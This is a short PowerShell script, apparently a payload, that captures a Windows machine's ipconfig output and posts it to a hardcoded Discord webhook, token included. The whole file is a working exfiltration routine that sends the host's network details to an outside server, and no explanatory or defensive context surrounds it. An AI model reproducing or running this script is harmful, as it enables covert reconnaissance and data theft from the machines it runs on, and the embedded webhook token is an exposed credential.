$webhookUrl = "https://discord.com/api/webhooks/1354265213477851246/cuHgwA8xLpNhSWpr8A-nz8xnBnKHgG9BsSRrjq6-FV0zJIRYb0WAun4Vaj8INFZnpQQm"
$ipconfigOutput = ipconfig | Out-String
$payload = @{content = "IPConfig Output:`n" + $ipconfigOutput} | ConvertTo-Json -Depth 10
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
